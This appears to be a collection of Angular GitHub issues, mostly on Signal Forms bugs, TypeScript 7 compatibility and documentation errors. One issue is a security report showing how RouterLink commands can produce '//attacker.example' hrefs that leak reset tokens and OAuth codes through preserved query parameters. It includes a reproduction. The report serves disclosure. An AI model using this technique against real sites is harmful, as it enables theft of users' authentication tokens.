title: Signal Forms coerce  null  to numeric value on text inputs ( <input type="text"> ) in v22
author: xMikee
body:
### Which @angular/* package(s) are the source of the bug?

forms

### Is this a regression?

Yes

### Description

When using Signal Forms in Angular v22 with a standard text input (e.g.,  <input type="text"> ), if the model's value is
  programmatically set to  null  (or receives  null  as an initial/updated value), the form control incorrectly treats/coerces this value
  as a numeric type instead of remaining  null  or an empty string.
  This is a regression, as the exact same implementation worked correctly and preserved the expected text/null type in Angular v21. This
  is particularly noticeable on typed string fields  or generic text fields where passing  null  unexpectedly alters the
  value type.

title: Signal Forms: Native <select> does not support FormField<number>
author: Akash-Peace
body:
### Which @angular/* package(s) are the source of the bug?

@angular/forms

### Is this a regression?

No

### Description

When using Signal Forms with a model containing a numeric property, binding a native `<select>` element to a `FormField<number>` produces a compile-time type error.

**Example model:**

```ts
interface Model {
  count: number;
}

model = signal<Model>({
  count: 1,
});

formModel = form(this.model);
```

**Template:**

```html
<select [formField]="formModel.count">
  <option [value]="1">1</option>
  <option [value]="2">2</option>
</select>
```

> `formModel.count` is underlined with a type error.

**Compiler error:**

```text
Type 'number' is not assignable to type 'string'. ngtsc(2322)
```

The same model works correctly with:

```html
<input type="number" [formField]="formModel.count">
```

Is this the expected behavior, or should Signal Forms support numeric `<select>` values in the same way that `input[type="number"]` does?

### Please provide a link to a minimal reproduction of the bug

https://stackblitz.com/edit/stackblitz-starters-qjz9zmaj?file=src%2Fmain.ts

### Please provide the exception or error you saw

```text
Type 'number' is not assignable to type 'string'. ngtsc(2322)

Error occurs on:

<select [formField]="formModel.count">
```

### Please provide the environment you discovered this bug in (run `ng version`)

### Anything else?

The issue only occurs with a native `<select>` element.

Using:

```html
<input type="number" [formField]="formModel.count">
```

works as expected.

The Angular Signal Forms documentation mentions automatic conversion for `input[type="number"]`, but it is unclear whether native `<select>` elements are intended to support numeric model values or only string model values.

If this behavior is intentional, the documentation could explicitly mention that `<select>` currently only supports `FormField<string>`. Otherwise, this may be a typing issue in Signal Forms.

title: Typescript v7.0 (with Typescript v6.0 APIs)
author: muhamedkarajic
body:
### Which @angular/* package(s) are relevant/related to the feature request?

compiler

### Description

With the release of Typescript v7.0.2, I hope this is seen as a huge win for every project. A 10Г— improvement in TypeScript performance will dramatically reduce compile times, so with my limited knowledge I think it deserves to be treated as a high priority by the Angular team.

https://devblogs.microsoft.com/typescript/announcing-typescript-7-0/#running-side-by-side-with-typescript-6.0 
The article mentions that TypeScript v6 and v7 can run side by side. Is Angular planning to take advantage of this in v22.1 or v23.0? Or would that provide little benefit, meaning we'd need to wait for TypeScript v7.1 before seeing any significant improvements? How is the situation about doing it that way or is it not possible because e.g. so much work is even then required that it outweights the PROs?

If the latter is the case, and TypeScript v7.1 only arrives alongside e.g. Angular v24.0, many Angular devs will likely be disappointed. Is there anything the community can do to help accelerate adoption? Is there anything individuals like me could contribute? 

Faster compile times mean faster feedback loops, quicker iterations, and ultimately more productive (agentic) workflows. This also has implications for feature shippings as well as AI-assisted development - which is in most companies the main topic.

From a communication perspective, I think it would help if the Angular team shared more insight into the roadmap and the technical constraints involved, which is what you might have but I could not find the PR/post. As an user (developer), it's easy to perceive these kinds of improvements as taking a long time, even when there are valid engineering reasons. More transparency would help the community better understand the trade-offs and make it easier for us to communicate those reasons to other non-Angular devs & managers. It also then provides a more fair ground evaluating/reasoning about other frontend framework/lib alternatives. Based on such insights company decisions aka judgment calls will have to be made. 

I'm not an expert on the implementation details, this is simply my perspective as a user who wants to see Angular continue improving. As well as someone who hopes that the branding perception from non-Angular devs will finally change. It only be differently perceived under the above conditions. 

If it was wrong to open yet another ticket, I am sorry for that but I felt that the previous https://github.com/angular/angular/issues/69704 discussion(s) lacked context.

P.S: If this needs to be internally discussed, I think this should stay open, or an alternative issue ticket so that we get that feedback when its possible. 

### Proposed solution

- Typescript v7.0 (with Typescript v6.0 calling the necessary APIs) is implemented or 
- a (more) transparent reason is given.

Besides that, I think the Angular team should consider having a roadmap so we can have roughly the expectations what comes next.

### Alternatives considered

None.

title: Request: Broader TypeScript peer dependency range for Angular 22.x (TypeScript 7.x support)
author: ibrahimKaya66
body:
### Description

Angular 22.x currently declares a narrow TypeScript peer dependency (`>=6.0 <6.1`). TypeScript 7.0 has been released, but projects cannot upgrade to it while staying on Angular 22 because `@angular/compiler-cli` fails at compile time (e.g. `readConfiguration` / `DiagnosticCategory` incompatibilities).

This forces teams to stay on TypeScript 6.0.x even when they want to adopt newer TypeScript language and tooling features.

### Motivation

- TypeScript releases often land before Angular officially widens its peer range.
- Narrow peer ranges block legitimate upgrades and create friction for teams that track TypeScript closely.
- Clearer / broader support windows (or earlier preview support) would reduce version lock-in and avoid broken `ng serve` / `ng build` after a TypeScript bump.

### Current behavior

| Package | Constraint |
| --- | --- |
| Angular | 22.0.x |
| Declared TypeScript peer | `>=6.0 <6.1` |
| TypeScript 7.0.x | Not supported; build fails |

### Expected / requested behavior

1. Widen or accelerate TypeScript peer dependency support so newer TypeScript majors/minors can be adopted sooner (ideally TypeScript 7.x on Angular 22.x or the next patch/minor).
2. Document supported TypeScript ranges clearly per Angular version, and call out when a TypeScript release is intentionally unsupported.
3. Where possible, reduce coupling so minor TypeScript upgrades do not hard-break the Angular compiler CLI.

### Environment

- Angular: 22.0.6
- `@angular/compiler-cli`: 22.0.6
- TypeScript (desired): 7.0.x
- TypeScript (working): 6.0.3
- Node.js: 22+ / 26

### Additional context

This is a feature / compatibility request, not a report that Angular 22 is broken on its supported TypeScript range. The ask is to reduce TypeScript version lock-in so applications can upgrade TypeScript without waiting for a full Angular major, and without runtime/compile failures when doing so.

Thank you for considering this.

title: RouterLink can serialize internal route commands into protocol-relative external hrefs
author: SkyZeroZx
body: ### Which @angular/* package(s) are the source of the bug? router ### Is this a regression? No ### Description `RouterLink` is documented as a directive that creates links for Angular route navigation. The input is treated as commands passed to `Router#createUrlTree`, or as a `UrlTree`. However , `RouterLink` can serialize some internal Angular route command forms into an `href` that starts with `//`. Browsers treat `//attacker.example/path` as a scheme-relative external URL. On an HTTPS app, that becomes: ```text https://attacker.example/path ``` So an application can use `RouterLink` expecting internal Angular navigation, but Angular writes an attacker-controlled external URL into the DOM. The issue appears when the internal route command creates an empty leading primary segment after the app root. ## Attacker redirect cases Validated cases that generate an external attacker-controlled `href`: | Case | RouterLink command | Attacker-controlled input | Generated href | | ---- | ---------------------------------------------- | ----------------------------------------------- | -------------------------------- | | 1 | `['/', '', host, path]` | `host = 'attacker.example'`, `path = 'collect'` | `//attacker.example/collect?...` | | 2 | `['/', ...next.split('/')]` | `next = '/attacker.example/collect'` | `//attacker.example/collect?...` | | 3 | `[{ outlets: { primary: next } }]` | `next = '/attacker.example/collect'` | `//attacker.example/collect?...` | | 4 | `[{ outlets: { primary: ['', host, path] } }]` | `host = 'attacker.example'`, `path = 'collect'` | `//attacker.example/collect?...` | On an HTTPS application, all of these browser-resolve to: ```text https://attacker.example/collect?... ``` The impact becomes security-relevant when the app also uses: ```html queryParamsHandling="preserve" ``` or: ```html queryParamsHandling="merge" ``` In those modes, Angular can copy the current URL query parameters into the generated external link. Example trusted URL: ```text https://victim.example/reset?token=RESET_TOKEN&code=OAUTH_CODE&next=/attacker.example/collect ``` Generated `RouterLink` href: ```html ``` Browser destination: ```text https://attacker.example/collect?token=RESET_TOKEN&code=OAUTH_CODE&next=... ``` This can leak values such as password reset tokens, magic-login tokens, invite tokens, OAuth authorization codes, OAuth state values, or email verification tokens. ## Minimal reproduction ```ts import { Component, inject } from "@angular/core"; import { ActivatedRoute, RouterLink } from "@angular/router"; @Component({ selector: "app-home", imports: [RouterLink], template: ` Case 1 Case 2 Case 3 Case 4 `, }) export class Home { private readonly route = inject(ActivatedRoute); readonly host = this.route.snapshot.queryParamMap.get("host") ?? "attacker.example"; readonly path = this.route.snapshot.queryParamMap.get("path") ?? "collect"; readonly next = this.route.snapshot.queryParamMap.get("next") ?? `/${this.host}/${this.path}`; readonly noSplitCommands = ["/", "", this.host, this.path]; readonly splitCommands = ["/", ...this.next.split("/")]; readonly primaryOutletCommands = [{ outlets: { primary: this.next } }]; readonly primaryOutletArrayCommands = [ { outlets: { primary: ["", this.host, this.path] } }, ]; } ``` ## Additional A normal left-click without `target` may be intercepted by Angular. However, the external `href` already exists in the DOM and can still be followed by native anchor navigation paths such as: ```text target="_blank", "_top", "_parent", or named target middle-click Ctrl/Cmd-click context menu -> open link in new tab/window SSR / pre-hydration link following no-JavaScript clients crawlers, preview bots, or link scanners child click handlers that call stopPropagation() without preventDefault() ``` ### Please provide a link to a minimal reproduction of the bug This was previously reported at https://issuetracker.google.com/u/1/issues/531036578, however it is not considered a problem, I believe it should be reconsidered

title: minLength() and maxLength() don't set input validity
author: jonaskuske
body:
### Which @angular/* package(s) are the source of the bug?

forms

### Is this a regression?

No

### Description

Unlike `min()` or `max()`, `minLength()` and `maxLength()` do not set native validity on the input, even though the attribute is there:

```ts
import { Component, signal } from '@angular/core';
import { form, min, minLength, FormField, FormRoot } from '@angular/forms/signals';

@Component({
  selector: 'app-repro',
  template: `
  <form [formRoot]="form">

    <!-- not reported as :invalid, despite directive adding minlength="5" -->
    <input type="text" [formField]="form.text" />

    <!-- :invalid, gets red border and has .validationMessage and .validity -->
    <input type="number" [formField]="form.num" />

  </form>
  `,
  styles: `
    input:invalid { border: 2px solid red; }
  `
})
export class Repro extends Component  {
  readonly form = form(signal({ text: '', num: 0 }), (schema) => {
    min(schema.num, 5)
    minLength(schema.text, 5)
  })
}
```

### Please provide a link to a minimal reproduction of the bug

_No response_

### Please provide the exception or error you saw

```true
The input[type="text"] does not register natively as invalid (in CSS or `el.validity`) - but the `input[type="number"]` does and is rendered with a red border.
```

title: Document that "provideZoneChangeDetection" requires adding "zone.js" to the "polyfill" array
author: cpierceworld
body:
### Describe the problem that you experienced

The Angular 20 -> 21 upgrade-guide doesn't specifically mention to add "zone.js" to the polyfill. 

the upgrade automatically added "provideZoneChangeDetection" for backward compatibility (which is good) but it didn't add "zone.js" to polyfill.

There is an unclear reference if you say "Advanced" upgrade that says:

> If using provideZoneChangeDetection without the ZoneJS polyfill, note that the internal scheduler is now always enabled. Review your app's timing as this may alter behavior that previously relied on the disabled scheduler.

That seems to imply that you should (maybe?) added ZoneJS polyfill, but it's not clear at all. (honestly, I'm not sure what the "internal scheduler" is).

The API documentation for "[provideZoneChangeDetection](https://angular.dev/api/core/provideZoneChangeDetection)" makes no mention of it either.

The only place I found that mentioned ithe need to ad "zone.js" to the polyfill list is a non-Angular site: [https://www.angulararchitects.io/en/blog/whats-new-in-angular-21-signal-forms-zone-less-vitest-angular-aria-cli-with-mcp-server](https://www.angulararchitects.io/en/blog/whats-new-in-angular-21-signal-forms-zone-less-vitest-angular-aria-cli-with-mcp-server)

title: FormField interopNgControl is missing some commonly used methods to implement CVA in custom components
author: riccardoperra
body:
### Which @angular/\* package(s) are the source of the bug?

forms

### Is this a regression?

No

### Description

As the interopNgControl says:

> A fake version of \`NgControl\` provided by the \`Field\` directive. This allows interoperability with a wider range of components designed to work with reactive forms, in particular ones that inject the \`NgControl\`

The current `interop_ng_control` implementation does not expose several commonly used `NgControl` APIs when injected inside custom ControlValueAccessor implementation (mostly done for reactive forms/template driven forms integrations).

[https://github.com/angular/angular/blob/95b7385cfbf654622840f99c1403acb8f89e4660/packages/forms/signals/src/controls/interop\_ng\_control.ts#L56-L66](https://github.com/angular/angular/blob/95b7385cfbf654622840f99c1403acb8f89e4660/packages/forms/signals/src/controls/interop_ng_control.ts#L56-L66)

Issue is reproducible in the following [link](https://stackblitz.com/edit/stackblitz-starters-nrpsurpr?description=An%20angular-cli%20project%20based%20on%20@angular/animations,%20@angular/common,%20@angular/compiler,%20@angular/core,%20@angular/forms,%20@angular/platform-browser,%20@angular/platform-browser-dynamic,%20@angular/router,%20core-js,%20rxjs,%20tslib%20and%20zone.js\&file=src%2Fcontrol.ts,src%2Finput.ts,src%2Fmain.ts\&template=node\&title=Angular%20Starter)

Both open-source and commercial Angular design systems have long adopted an alternative approach to ControlValueAccessor compared to Angular Material. The approach is like injecting NgControl, manually assign the valueAccessor, and subscribe to control events. This allowed to reduce the boilerplate required to build custom form controls, working with OnPush and enabling helper components (ErrorField?) that can integrate directly with NgControl in a granular way.

For example:

- TaigaUI [TuiControl](https://github.com/taiga-family/taiga-ui/blob/main/projects/cdk/classes/control.ts#L83) (which was upgraded with signals, but were using rxjs and class properties before)
  - https://github.com/taiga-family/taiga-ui/issues/14007
- [ngxtension ControlValueAccessor](https://ngxtension.dev/utilities/forms/control-value-accessor/) and the [NgxControlError](https://ngxtension.dev/utilities/forms/control-error/) helper (bind the ngControl, listen for statuschange and display the error without the boilerplate)
- ngZorro https://github.com/NG-ZORRO/ng-zorro-antd/pull/9701

and more...

In case I've tried to open a PR some months ago that may fix those errors, but still some properties are missing! https://github.com/angular/angular/pull/67087 . Idk if my solution fit well for u all

title: Incorrect import path for `AdminPage` in Angular routing documentation
author: MohanKumarAmbati
body: ### Describe the problem that you experienced I noticed a discrepancy in the routing example on the Angular documentation. The example shows: ```typescript import { HomePage } from './home-page'; import { AdminPage } from './about-page'; export const routes: Routes = [ { path: '', component: HomePage, }, { path: 'admin', component: AdminPage, }, ]; ``` The AdminPage component is imported from ./about-page, while the route path and component name both refer to "admin". This appears inconsistent and may confuse readers. I believe one of the following should be corrected: - If the component is intended to be `AdminPage`, the import should likely be: ```typescript import { AdminPage } from './admin-page'; ``` - Or, if the import from `./about-page` is intentional, then the component name should probably be `AboutPage` and the route updated accordingly. Could you please verify whether this is a documentation typo? ### Enter the URL of the topic with the problem https://angular.dev/guide/routing/define-routes ### Describe what you were looking for in the documentation _No response_ ### Describe the actions that led you to experience the problem _No response_ ### Describe what you want to experience that would fix the problem The import path, component name, and route example should consistently refer to the same page (either `AdminPage`/`admin-page` or `AboutPage`/`about-page`). ### Add a screenshot if that helps illustrate the problem ### If this problem caused an exception or error, please paste it here ```true ``` ### If the problem is browser-specific, please specify the device, OS, browser, and version ```true ``` ### Provide any additional information here in as much as detail as you can ```true ```

title: [formField] directive on mat-radio-group prevents dynamic [name] binding, causing native browser radio selection wipe during cdkDragDrop
author: pdelekta
body:
### Which @angular/* package(s) are the source of the bug?

forms

### Is this a regression?

No

### Description

When using the new Signal Forms `[formField]` directive on a `<mat-radio-group>` that is located inside a `cdkDragList`, the visual selection of the radio button is cleared when the item is dragged and dropped.

This occurs because `cdkDragDrop` detaches and moves the DOM node. During this DOM movement, the browser natively wipes the `<input type="radio">` selection if the name attributes are not stable and globally unique.

By default, Signal Forms assign a `name` based on the array path/index (e.g., `form0.myArray.0`). While developers can usually bypass browser radio-group collisions by binding a unique model ID to `[name]="item().id"`, the `[formField]` directive's internal host bindings silently swallow/overwrite custom dynamic [name] bindings during change detection.

### Expected behavior:

A developer should be able to explicitly bind a dynamic `[name]` attribute on a `mat-radio-group` to provide stable, unique names to the underlying inputs, bypassing the `[formField]` index-based default.

Dragging and dropping an item within a Form Array should retain its visual checked state.

### Actual behavior:

The `[formField]` directive ignores the custom `[name]` binding and applies array-index-based names (which Material propagates to the hidden native `<input type="radio">` elements).

When the array is re-ordered on drop, the DOM node is moved, and the item's index path changes. The browser natively clears the radio selection because the underlying native input's name attribute isn't tied to a stable ID.

The UI empties, even though the Signal Form's model data retains the correct valid state.

### Technical Root Cause & Workaround:
The issue stems from a compilation collision. `[formField]` manages the `name` via an internal host binding during change detection, which overrides user-provided dynamic `[name]` properties.

To currently work around this, developers must write a custom directive using `afterEveryRender` to manually query the native `input[type="radio"]` DOM nodes and forcefully overwrite the name attribute to a stable ID immediately after Angular finishes its change detection cycles.

https://stackblitz.com/edit/ibnasztc?file=src%2Fexample%2Fitem-form.component.ts

title: Make signal forms production ready for real world apps
author: vladt22
body:
### Which @angular/* package(s) are relevant/related to the feature request?

_No response_

### Description

So for input type="number" model with "number | null" field is ok. But for input type="text" "string | null" is not ok? Built-in validation rules dont work with "string | null" either! Select input does not support numeric IDs for option values! But 99.9% modern apps have numbers for entity keys... We already have to review all fields and make sure undefined is not used because apparently its "bad"! But that's not enough. We now need to duplicate all our data classes just to make "signal-friendly" versions :(

I wonder what real-life enterprise-level development teams did Angular architects consulted with before declaring Signal Forms production ready?

### Proposed solution

Please review signal forms and make them easier to use compared to reactive forms. Not harder!

### Alternatives considered

For now we are creating custom directives with models like these:

value = model<string | null>(null);

value = model<number | null>(null);

title: disabledExcept feature for signal forms
author: gneu77
body:
### Which @angular/* package(s) are relevant/related to the feature request?

`@angular/forms/signals`

### Description

With `disabled(path, { when: myConditional });`, I can disable a whole path under some condition.
However, I often have huge forms where I need to disable all but a few distinct fields under some condition.

Writing dozens of `disabled(path.f1, { when: myConditional });`, `disabled(path.f2, { when: myConditional });`, ... is not only cumbersome, but also requires me to remember that I need to add another disabled rule when I extend my form model by a new field.

I tried to implement my own `allDisabledExcept` function, but then noticed it to be less trivial than I thought, because the FieldPathNode proxies that I have to handle in such implementation seem to be for internal usage only.

(Sorry, if this has already been requested by other people and I did not find)

### Proposed solution

It would be nice to simply extend the existing `disabled` like so:
`disabled(path, { when: myConditional, except: [path.f3.f3_2.f3_2_5, path.f3.f3_2.f3_2_6] });`

### Alternatives considered

Implementing own `allDisabledExcept` function, but this does not seem to be trivial.
